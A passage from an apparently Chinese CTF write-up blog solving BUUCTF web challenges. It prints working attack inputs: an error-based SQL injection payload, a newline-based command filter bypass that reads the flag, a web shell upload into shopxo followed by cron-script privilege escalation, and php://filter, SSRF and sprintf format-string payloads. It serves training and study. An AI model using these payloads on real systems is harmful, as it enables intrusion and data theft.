string">'/**/&amp;&amp;/**/ST_LatFromGeoHash(concat(0x7e,(select/**/i.2/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/users)i/**/limit/**/1,1),0x7e))/**/&amp;&amp;'</span>a<span class="token string">'='</span>a<span class="token number">1</span><span class="token string">'/**/&amp;&amp;/**/ST_LatFromGeoHash(concat(0x7e,(select/**/i.3/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/users)i/**/limit/**/1,1),0x7e))/**/&amp;&amp;'</span>a<span class="token string">'='</span>a</code></pre><h1 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h1><p>给了源码</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string">'PATH=/home/rceservice/jail'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//修改了环境变量，只能用绝对路径来调用系统命令</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token variable">$json</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'Hacking attempt detected&lt;br/>&lt;br/>'</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/'</span><span class="token punctuation">,</span> <span class="token variable">$json</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'Hacking attempt detected&lt;br/>&lt;br/>'</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'Attempting to run command:&lt;br/>'</span><span class="token punctuation">;</span>    <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$cmd</span> <span class="token operator">!==</span> <span class="token keyword">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>      <span class="token keyword">echo</span> <span class="token string">'Invalid input'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">echo</span> <span class="token string">'&lt;br/>&lt;br/>'</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>很常见的点了，preg_match这种形式，虽然过滤很多但可以用%0A绕过。</p><p>遍历根目录。根目录下没flag…..</p><pre><code>cmd={%0A&quot;cmd&quot;:&quot;ls%20/&quot;%0A}</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201216161639143.png" srcset="/img/loading.gif" alt="image-20201216161639143"></p><p>测试代码里那个路径</p><pre><code>?cmd={%0A&quot;cmd&quot;:&quot;ls%20/home/rceservice/&quot;%0A}</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201216162442508.png" srcset="/img/loading.gif" alt="image-20201216162442508"></p><pre><code>?cmd={%0A&quot;cmd&quot;:&quot;/bin/cat%20/home/rceservice/flag&quot;%0A}</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201216162802470.png" srcset="/img/loading.gif" alt="image-20201216162802470"></p><h1 id="GKCTF2020-老八小超市儿"><a href="#GKCTF2020-老八小超市儿" class="headerlink" title="[GKCTF2020]老八小超市儿"></a>[GKCTF2020]老八小超市儿</h1><p><strong>考点：shopxo文件上传漏洞</strong></p><p>进来是个购物商城，powered by shopxo。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201217135249247.png" srcset="/img/loading.gif" alt="image-20201217135249247"></p><p>而且还很贴心的在友链直接给了源码。</p><p>文档里有后台和初始密码，试试。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201217135411645.png" srcset="/img/loading.gif" alt="image-20201217135411645"></p><p>弱密码永远滴绳！进来了。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201217135541512.png" srcset="/img/loading.gif" alt="image-20201217135541512"></p><p>找找有没有上传点。好的没传上去。直接去找找洞。</p><blockquote><p>参考：<a href="https://www.zhihuifly.com/t/topic/678" target="_blank" rel="noopener">https://www.zhihuifly.com/t/topic/678</a></p></blockquote><p>先在应用中心的应用管理里下个模板，再在模板里加个木马传上去。</p><p>结果提示权限不够。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201217145328385.png" srcset="/img/loading.gif" alt="image-20201217145328385"></p><p>看了眼权限管理，还有个超级管理员。试了一下密码还是shopxo。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201217145414622.png" srcset="/img/loading.gif" alt="image-20201217145414622"></p><p>登录后传上了。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201217153159796.png" srcset="/img/loading.gif" alt="image-20201217153159796"></p><p>蚁剑连马。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201217153421446.png" srcset="/img/loading.gif" alt="image-20201217153421446"></p><p>根目录下是假flag。提示在/root里。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201217153448832.png" srcset="/img/loading.gif" alt="image-20201217153448832"></p><p>​    去看/root 没权限。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201217153532207.png" srcset="/img/loading.gif" alt="image-20201217153532207"></p><p>根目录下有一个Hint。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201217153646436.png" srcset="/img/loading.gif" alt="image-20201217153646436"></p><p>还有一个bash定时执行脚本。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201217153956331.png" srcset="/img/loading.gif" alt="image-20201217153956331"></p><p>去找这个py文件,他估计就是hint里提示的date。正好有可写权限。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> io<span class="token keyword">import</span> timeos<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"whoami"</span><span class="token punctuation">)</span>gk1<span class="token operator">=</span>str<span class="token punctuation">(</span>time<span class="token punctuation">.</span>ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>gk<span class="token operator">=</span><span class="token string">"\nGet The RooT,The Date Is Useful!"</span>f<span class="token operator">=</span>io<span class="token punctuation">.</span>open<span class="token punctuation">(</span><span class="token string">"/flag.hint"</span><span class="token punctuation">,</span> <span class="token string">"rb+"</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>str<span class="token punctuation">(</span>gk1<span class="token punctuation">)</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>str<span class="token punctuation">(</span>gk<span class="token punctuation">)</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>而且回头看下auto.sh，所属是root，755权限。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201217154547589.png" srcset="/img/loading.gif" alt="image-20201217154547589"></p><p>那改改py脚本获取flag就可以了。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201217160720460.png" srcset="/img/loading.gif" alt="image-20201217160720460"></p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201217160728980.png" srcset="/img/loading.gif" alt="image-20201217160728980"></p><h1 id="BJDCTF-2nd-文件探测"><a href="#BJDCTF-2nd-文件探测" class="headerlink" title="[BJDCTF 2nd]文件探测"></a>[BJDCTF 2nd]文件探测</h1><p><strong>考点：伪协议、sprintf格式化字符串漏洞、session绕过</strong></p><p>F12有个hint。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201217161022071.png" srcset="/img/loading.gif" alt="image-20201217161022071"></p><p>访问home.php,网页跳转多了个参数。这么看应该是file参数后接了个.php。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201217162156406.png" srcset="/img/loading.gif" alt="image-20201217162156406"></p><p>很难不想到是不是有伪协议。先试试。</p><pre><code>home.php?file=php://filter/read=convert.base64-encode/resource=system</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201217162532505.png" srcset="/img/loading.gif" alt="image-20201217162532505"></p><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//system.php</span><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//要求有相应cookie</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'y1ng'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'y1ng'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">'y1ng'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;script>alert('why you are here!');alert('fxck your scanner');alert('fxck you! get out!');&lt;/script>"</span><span class="token punctuation">;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Refresh:0.1;url=index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$str2</span> <span class="token operator">=</span> <span class="token string">'&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;url invalid&lt;br>~$ '</span><span class="token punctuation">;</span><span class="token variable">$str3</span> <span class="token operator">=</span> <span class="token string">'&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;damn hacker!&lt;br>~$ '</span><span class="token punctuation">;</span><span class="token variable">$str4</span> <span class="token operator">=</span> <span class="token string">'&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;request method error&lt;br>~$ '</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?php</span><span class="token variable">$filter1</span> <span class="token operator">=</span> <span class="token string">'/^http:\/\/127\.0\.0\.1\//i'</span><span class="token punctuation">;</span><span class="token variable">$filter2</span> <span class="token operator">=</span> <span class="token string">'/.?f.?l.?a.?g.?/i'</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'q1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'q2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'q3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//q1存在就行</span>    <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'q2'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">".y1ng.txt"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//锚点注释掉拼接的字符串</span>    <span class="token variable">$method</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'q3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$str1</span> <span class="token operator">=</span> <span class="token string">"~$ python fuck.py -u \""</span><span class="token punctuation">.</span><span class="token variable">$url</span> <span class="token punctuation">.</span><span class="token string">"\" -M $method -U y1ng -P admin123123 --neglect-negative --debug --hint=xiangdemei&lt;br>"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$str1</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$filter1</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//q2要求http://127.0.0.1/开头</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$filter2</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//q2不能存在flag</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$str3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^GET/i'</span><span class="token punctuation">,</span> <span class="token variable">$method</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^POST/i'</span><span class="token punctuation">,</span> <span class="token variable">$method</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//q3以GET或POST开头</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$str4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$detect</span> <span class="token operator">=</span> @<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string">"$url method&amp;content_size:$method%d"</span><span class="token punctuation">,</span> <span class="token variable">$detect</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">//这个没见过，在下面写总结</span><span class="token delimiter">?></span></code></pre><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//home.php</span><span class="token delimiter">&lt;?php</span><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">"y1ng"</span><span class="token punctuation">,</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">'y1ng'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">3600</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'your_ip_address'</span><span class="token punctuation">,</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">3600</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/\^|\~|&amp;|\|/"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"forbidden"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/.?f.?l.?a.?g.?/i"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"not now!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/.?a.?d.?m.?i.?n.?/i"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"You! are! not! my! admin!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/^home$/i"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"禁止套娃"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/home$/i"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/system$/i"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">".php"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">".fxxkyou!"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">echo</span> <span class="token string">"现在访问的是 "</span><span class="token punctuation">.</span><span class="token variable">$file</span> <span class="token punctuation">.</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">require</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;script>location.href='./home.php?file=system'&lt;/script>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>扫下后台。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201218095825943.png" srcset="/img/loading.gif" alt="image-20201218095825943"></p><p>看下robots.txt。结果这都扫出来了 = =。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201218095850447.png" srcset="/img/loading.gif" alt="image-20201218095850447"></p><p>先读下admin.php，伪协议那儿是不行了,从system.php入手。</p><p>q1随便传个参，q2由<a href="http://127.0.0.1/开头，拼接的&quot;.y1ng.txt&quot;用#注释掉。" target="_blank" rel="noopener">http://127.0.0.1/开头，拼接的&quot;.y1ng.txt&quot;用#注释掉。</a></p><pre class=" language-php"><code class="language-php">    <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'q2'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">".y1ng.txt"</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$filter1</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//q2要求http://127.0.0.1/开头</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$filter2</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//q2不能存在flag</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$str3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^GET/i'</span><span class="token punctuation">,</span> <span class="token variable">$method</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^POST/i'</span><span class="token punctuation">,</span> <span class="token variable">$method</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//q3以GET或POST开头</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$str4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$detect</span> <span class="token operator">=</span> @<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string">"$url method&amp;content_size:$method%d"</span><span class="token punctuation">,</span> <span class="token variable">$detect</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//这个%d导致$detect无法输出</span></code></pre><p>重点在q3，由于%d的存在导致$detect无法输出。</p><p>这里利用sprintf漏洞，构造q3=GET%s%,相当于</p><pre class=" language-php"><code class="language-php"><span class="token constant">GET</span><span class="token operator">%</span>S<span class="token operator">%</span><span class="token operator">%</span>d <span class="token comment" spellcheck="true">//百分号被转义（%%）</span></code></pre><p>payload</p><pre><code>q1=1&amp;q2=http://127.0.0.1/admin.php#&amp;q3=GET%s%%d</code></pre><p>看其他人wp还可以构造q3=%1$s,也就是将函数中的第一个参数以sring型输出。</p><pre><code>q1=1&amp;q2=http://127.0.0.1/admin.php#&amp;q3=GET%1$s</code></pre><p>得到admin.php</p><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//admin.php</span><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$f1ag</span> <span class="token operator">=</span> <span class="token string">'f1ag{s1mpl3_SSRF_@nd_spr1ntf}'</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//fake</span><span class="token keyword">function</span> <span class="token function">aesEn</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$method</span> <span class="token operator">=</span> <span class="token string">'AES-128-CBC'</span><span class="token punctuation">;</span>    <span class="token variable">$iv</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span>  <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">openssl_encrypt</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$method</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token constant">OPENSSL_RAW_DATA</span> <span class="token punctuation">,</span> <span class="token variable">$iv</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">Check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'your_ip_address'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'your_ip_address'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'y1ng'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">'y1ng'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//这些对flag没影响就不改了</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"127.0.0.1"</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;head>&lt;title>403 Forbidden&lt;/title>&lt;/head>&lt;body bgcolor=black>&lt;center>&lt;font size='10px' color=white>&lt;br>only 127.0.0.1 can access! You know what I mean right?&lt;br>your ip address is "</span> <span class="token punctuation">.</span> <span class="token variable">$_SERVER</span><span class="token 